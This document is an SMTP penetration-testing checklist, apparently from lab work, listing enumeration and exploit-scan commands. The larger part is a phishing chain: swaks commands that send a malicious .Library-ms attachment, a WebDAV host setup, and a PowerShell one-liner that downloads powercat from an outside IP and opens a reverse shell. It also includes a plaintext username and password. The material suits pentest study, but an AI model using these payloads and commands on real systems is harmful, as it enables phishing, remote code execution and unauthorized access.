# SMTP Pentesting Checklist & Commands

A practical guide for assessing SMTP services during penetration tests. Use responsibly and only with proper authorization.

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating SMTP (port 25), I realistically expect to find:

- [ ] Service banner revealing version and server details
- [ ] Users or valid email addresses through VRFY/EXPN enumeration
- [ ] Default or weak credentials (for authenticated SMTP)
- [ ] Possible open relay allowing external spam/phishing
- [ ] Vulnerabilities in specific server versions (known CVEs)
- [ ] Ability to send phishing emails with payload attachments
- [ ] Internal network or host information leaked in headers


## ‚úÖ SMTP Pentest Checklist

- [ ] **Check the SMTP Version**
```bash
nmap -p25 --script smtp-commands <IP>
nmap --script=smtp-* -p25 <IP>
```
- [ ] **Username Enumeration**

```bash
smtp-user-enum -M VRFY -U names.txt -t <IP>
use auxiliary/scanner/smtp/smtp_enum (Metasploit)
nc -nvv <IP> 25
VRFY root
telnet <IP> 25
```

- [ ] **Manual Verification via Telnet**

```
HELO anydomain.com
MAIL FROM: sender@domain.com
RCPT TO: user@target.com
```

- [ ] **Brute-Force / Exploit the Version**

```bash
nmap --script=smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p25 <IP>
searchsploit smtp
```

- [ ] **Phishing Attack with Swaks**
```bash
sudo swaks -t victim@domain.com --from attacker@domain.com --attach payload.Library-ms --server <IP> --body body.txt --header "Subject: Important Update" -ap
```
---

## ‚úÖ Recommended Nmap Commands

- Basic detection and safe scripts.
```bash
nmap -sC -sV -p25 <IP>
```

- User enumeration and vulnerability detection.
```bash
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p25 <IP>
```
---

## ‚úÖ Advanced Phishing Attack Example

- **Example Credential Use**
    maildmz:DPuBT9tGCBrTbR

- **Send Phishing Email with Attachment**
    sudo swaks -t jim@relia.com --from maildmz@relia.com --attach config.Library-ms --server 192.168.177.189 --body body.txt --header "Subject: Staging Script" -ap

- **Launch WebDAV Server for Payload Hosting**
    wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/

- **Example Malicious .Library-ms File**

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
        <name>@windows.storage.dll,-34582</name>
        <version>6</version>
        <isLibraryPinned>true</isLibraryPinned>
        <iconReference>imageres.dll,-1003</iconReference>
        <templateInfo>
            <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
        </templateInfo>
        <searchConnectorDescriptionList>
            <searchConnectorDescription>
                <isDefaultSaveLocation>true</isDefaultSaveLocation>
                <isSupported>false</isSupported>
                <simpleLocation>
                    <url>http://192.168.45.161</url>
                </simpleLocation>
            </searchConnectorDescription>
        </searchConnectorDescriptionList>
    </libraryDescription>
```

- **Example Shortcut Payload**
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.161:8000/powercat.ps1'); powercat -c 192.168.45.161 -p 4444 -e powershell"
```

- **Supporting Infrastructure**
    - Python server on port 8000 to host powercat.ps1
    - Netcat listener on port 4444 for reverse shell

---

## ‚úÖ Final Attack Launch Command

    sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.208.189 --body body.txt --header "Subject: Staging Script" -ap
    Username: maildmz
    Password: DPuBT9tGCBrTbR
